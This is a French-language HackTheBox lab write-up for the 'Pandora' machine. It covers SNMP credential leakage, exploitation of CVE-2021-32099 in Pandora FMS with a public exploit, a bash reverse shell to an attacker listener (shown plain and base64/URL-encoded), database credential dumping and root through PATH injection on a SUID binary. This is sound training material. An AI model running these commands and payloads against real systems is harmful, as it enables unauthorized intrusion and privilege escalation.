---
title: HTB | Pandora
description: Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user daniel. Host enumeration reveals Pandora FMS running on an internal port, which can be accessed through port forwarding. Lateral movement to another user called matt is achieved by chaining SQL injection RCE vulnerabilities in the PandoraFMS service. Privilege escalation to user root is performed by exploiting a SUID binary for PATH variable injection.
slug: pandora-htb
date: 2025-09-05 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Pandora cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Pandora</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.136</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
daniel : HotelBabylon23
```

## Enumeration

### nmap TCP

```bash
$ nmap -sC -sV -An -T4 -vvv -p- 10.10.11.136
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24c295a5c30b3ff3173c68d7af2b5338 (RSA)
| ssh-rsa AAAAB3...........Dd8TnI/DFFs=
|   256 b1417799469a6c5dd2982fc0329ace03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLX..........Dea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e736433ba9478a190158b2bc89f65108 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

### Website (port 80)
Rien d'intéressant ! Le site est basé sur une template bootstrap, mais rien a signalé. Pas de fichiers suspects, pas de CVE, pas de XSS ou d'injection SQL.

### nmap UDP
Après un scan du top 1000 des ports **UDP**, on remarque le port 161 avec un serveur **SNMP** :
```bash
$ nmap -sU -sV --top-ports 1000 -T4 -vvv 10.10.11.136
PORT      STATE         SERVICE         REASON              VERSION
23/udp    open|filtered telnet          no-response
161/udp   open          snmp            udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
177/udp   open|filtered xdmcp           no-response
520/udp   open|filtered route           no-response
539/udp   open|filtered apertus-ldp     no-response
688/udp   open|filtered realm-rusd      no-response
782/udp   open|filtered hp-managed-node no-response
983/udp   open|filtered unknown         no-response
1026/udp  open|filtered win-rpc         no-response
1038/udp  open|filtered mtqp            no-response
1419/udp  open|filtered timbuktu-srv3   no-response
1719/udp  open|filtered h323gatestat    no-response
2161/udp  open|filtered apc-2161        no-response
2967/udp  open|filtered symantec-av     no-response
4008/udp  open|filtered netcheque       no-response
5001/udp  open|filtered commplex-link   no-response
6004/udp  open|filtered X11:4           no-response
16739/udp open|filtered unknown         no-response
17585/udp open|filtered unknown         no-response
17823/udp open|filtered unknown         no-response
18485/udp open|filtered unknown         no-response
18987/udp open|filtered unknown         no-response
19140/udp open|filtered unknown         no-response
19315/udp open|filtered keyshadow       no-response
19632/udp open|filtered unknown         no-response
19682/udp open|filtered unknown         no-response
20003/udp open|filtered commtact-https  no-response
20004/udp open|filtered unknown         no-response
20791/udp open|filtered unknown         no-response
21320/udp open|filtered unknown         no-response
21524/udp open|filtered unknown         no-response
21923/udp open|filtered unknown         no-response
22053/udp open|filtered unknown         no-response
27899/udp open|filtered unknown         no-response
31625/udp open|filtered unknown         no-response
32772/udp open|filtered sometimes-rpc8  no-response
33354/udp open|filtered unknown         no-response
37393/udp open|filtered unknown         no-response
40708/udp open|filtered unknown         no-response
44508/udp open|filtered unknown         no-response
49152/udp open|filtered unknown         no-response
49222/udp open|filtered unknown         no-response
Service Info: Host: pandora
```

## Foothold

### snmpwalk : daniel
On utilise le logiciel **snmpwalk** pour afficher diverses informations :
```bash
$ snmpwalk -v2c -c public 10.10.11.136                   
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (243441) 0:40:34.41
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (34) 0:00:00.34
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
...
$ snmpwalk -v2c -c public 10.10.11.136 > snmpwalk.out
$ grep -rni string snmpwalk.out
...
1867:iso.3.6.1.2.1.25.4.2.1.5.962 = STRING: "--no-debug"
1868:iso.3.6.1.2.1.25.4.2.1.5.977 = STRING: "-k start"
1869:iso.3.6.1.2.1.25.4.2.1.5.1085 = STRING: "-u daniel -p HotelBabylon23"  <----------
1870:iso.3.6.1.2.1.25.4.2.1.5.1225 = STRING: "-k start"
...
```
On trouve les credentials de l'utilisateur Daniel. En essayant de se connecter en SSH, ça fonctionne :
```bash
$ ssh daniel@10.10.11.136
daniel@10.10.11.136's password: 

Last login: Fri Sep  5 12:29:55 2025 from 10.10.14.8
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
daniel@pandora:~$ whoami
daniel
daniel@pandora:~$ ls /home/
daniel  matt
```
On découvre alors l'utilisateur **matt**.

## daniel -> matt

### Pandora CMS v7.0NG.742

On trouve un dossier "pandora_console" dans /var/www. On se rend compte dans /etc/host qu'il semble y a avoir un deuxieme site web sur 127.0.0.1:80. J'ai décidé de faire du port forwarding pour accéder au site web depuis mon navigateur sur le port 8888 de ma machine :
```bash
ssh daniel@10.10.11.136 -L 8888:127.0.0.1:80
```
On trouve alors une page de login **Pandora CMS v7.0NG.742**.

### CVE-2021-32099

Après quelque recherches, on trouve plusieurs CVE dont une injection SQL : **CVE-2021-32099**.

Elle nous permet de se connecter en tant qu'admin et de téléverser un fichier php nous permettant d'executer du code sur la machine en tant que l'utilisateur **matt**.

**Exploit** : https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/tree/master

J'ai pu utiliser un exploit déjà écrit, qui execute l'injection SQL et upload directement un fichier php pour nous. Il nous donne un shell non-interactif.

J'ai executé un reverse shell, que j'ai converti en base64 puis j'ai URL encoded le tout car je sais que le script python fait une requete GET sur le fichier php et passe mes commandes dans l'URL.
```bash
python3 sqlpwn.py -t 127.0.0.1:8888           
URL:  http://127.0.0.1:8888/pandora_console
[+] Sending Injection Payload
[+] Requesting Session
[+] Admin Session Cookie : lkgcnm6itdo17dmogbhc6733j1
[+] Sending Payload 
[+] Respose : 200
[+] Pwned :)
[+] If you want manual Control : http://127.0.0.1:8888/pandora_console/images/pwn.php?test=
CMD > bash -i >& /dev/tcp/10.10.14.8/1337 0>&1

CMD > echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC44LzEzMzcgMD4mMQ%3D%3D%20%7C%20base64%20-d%20%7C%20bash

--------------------------------------

$ nc -lnvp 1337                                 
matt@pandora:/var/www/pandora/pandora_console/images$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ges$ python3 -c 'import pty;pty.spawn("/bin/bash")'  
matt@pandora:/var/www/pandora/pandora_console/images$ export TERM=xterm
export TERM=xterm
matt@pandora:/var/www/pandora/pandora_console/images$ ^Z
[1]  + 27546 suspended  nc -lnvp 1337
$ stty raw -echo;fg   
[1]  + 27546 continued  nc -lnvp 1337
matt@pandora:/var/www/pandora/pandora_console/images$ whoami
matt
matt@pandora:/var/www/pandora/pandora_console/images$ cd /home/matt
matt@pandora:/home/matt$ cat user.txt
2251.....82e1
```

### Pandora Database Creds
J'ai trouvé le mot de passe de la base de donnée mysql mais impossible de cracker les hachages. Sauf celui de daniel, qui correspond bien au même mot de passe qu'en SSH.
```bash
matt@pandora:~$ cat /var/www/pandora/pandora_console/include/config.php 
<?php
// File generated by centos kickstart
$config["dbtype"] = "mysql";		
$config["dbname"]="pandora";		
$config["dbuser"]="pandora";		
$config["dbpass"]="PandoraFMSSecurePass2021";
$config["dbhost"]="localhost";			
$config["homedir"]="/var/www/pandora/pandora_console";
$config["homeurl"]="/pandora_console";	
error_reporting(0); 
$ownDir = dirname(__FILE__) . '/';
include ($ownDir . "config_process.php");
?>

-------------------

MariaDB [pandora]> select email,password from tusuario;
+--------------------+----------------------------------+
| email              | password                         |
+--------------------+----------------------------------+
| admin@pandora.htb  | ad3f741b04bd5880fb32b54bc4f43d6a |
| daniel@pandora.htb | 76323c174bd49ffbbdedf678f6cc89a6 |
| matt@pandora.htb   | f655f807365b6dc602b31ab3d6d43acc |
+--------------------+----------------------------------+
3 rows in set (0.000 sec)
```

## matt -> root

### SSH session
Dans un premier temps, j'ai essayé d'executer "sudo -l", mais une erreur bizarre s'affiche :
```bash
matt@pandora:/home/matt/.ssh$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```
J'ai donc décidé de générer une paire de clés et de me connecter à matt en utilisant **SSH** pour plus de stabilité. Cela va avoir son importance pour l'exploitation :
```bash
$  ssh-keygen -t rsa -b 4096 -f matt             
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in matt
Your public key has been saved in matt.pub
The key fingerprint is:
SHA256:BH80icivzuGhGoIvDyqROBTJ3Yos2GjweEF7u2FwJrI root@exegol-pentest
The key's randomart image is:
+---[RSA 4096]----+
|..+ .... .o.     |
|.+.o .oo....     |
|==*.=  .o .      |
|=B+B . ...       |
|Eo  +  .S        |
|*  . o+          |
|+o. .= o         |
|++ .. +          |
|oo+.             |
+----[SHA256]-----+

$ ssh matt@10.10.11.136 -i matt    

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
matt@pandora:~$ sudo -l
[sudo] password for matt:       # On observe bien qu'il n'y a plus d'erreur ici
matt@pandora:~$
```

### /usr/bin/pandora_backup
En utilisant **linpeas**, on découvre un binaire SUID suspect **/usr/bin/pandora_backup**. Après analyse du binaire, il semble execute la commande **tar** en tant que root. 

Il n'utilise pas un path absolu, comme par exemple "/bin/tar", ce qui va nous permettre de faire une attaque de type PATH injection :

Voici le code décompilé :
```bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __uid_t v3; // ebx
  __uid_t v4; // eax

  v3 = getuid();
  v4 = geteuid();
  setreuid(v4, v3);
  puts("PandoraFMS Backup Utility");
  puts("Now attempting to backup PandoraFMS client");
  if ( system("tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*") )
  {
    puts("Backup failed!\nCheck your permissions!");
    return 1;
  }
  else
  {
    puts("Backup successful!");
    puts("Terminating program!");
    return 0;
  }
}
```

Le problème majeur de cette box, est que si on se connecte pas en SSH, le binaire SUID ne s'execute pas en tant que root et il y a une erreur **Permission Denied** :

```bash
matt@pandora:/home/matt/.ssh$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
Check your permissions!
```

En utilisant **SSH**, le problème disparait et la commande **tar** s'execute bien en tant que **root**.  
Le binaire SUID est désormais exploitable :

```bash
matt@pandora:~$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup successful!
Terminating program!
```

Voici un exemple d'exploitation simple. On crée un fichier "tar" contenant la commande /bin/bash, on lui donne les droits en execution et on place le dossier où il se trouve (home directory de matt) au debut dans la variable **$PATH**. Lorsqu'on execute **which** on observe bien que notre **tar** à remplacer la véritable commande. Il ne reste plus qu'a executer notre binaire SUID pandora_backup pour obtenir un shell en tant que root :

```bash
matt@pandora:~$ echo "/bin/bash" > tar
matt@pandora:~$ chmod +x tar
matt@pandora:~$ export PATH=/home/matt:$PATH
matt@pandora:~# which tar
/home/matt/tar
matt@pandora:~$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~# whoami
root
root@pandora:~# cat /root/root.txt 
fd9c.....291d
```

## Tips
- **Toujours lancer un scan des ports UDP** : D'abord un petit scan, puis un gros si on ne trouve rien d'autre.
- Si le port SSH est ouvert : toujours essayer de générer une paire clés SSH, placé le .pub dans authorized_keys et effectuer une connexion. Sur cette boxe, il était un impossible de faire sudo -l. Un bug empêchant d'exploiter le binaire pandora_backup SUID. A travers la session SSH, le bug n'était plus présent. Donc dans le doute : toujours tenter une connexion SSH.

Pour savoir s'il est possble de se connecter en ssh, en utilisant une paire de clés il faut vérifier le fichier de configuration ssh coté serveur : `/etc/ssh/sshd_config`
Si :
- #PubkeyAuthentication yes --> Commenté, valeur par défaut "yes", donc c'est possible
- #AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2 --> commenté, par défaut ".ssh/authorized_keys" donc c'est Okay
- AllowUsers daniel matt --> Seulement ces utilisateurs peuvent se connecter en ssh
- UsePAM yes --> le mot de passe classique fonctionne via PAM mais ça ne bloque pas les clés pour autant

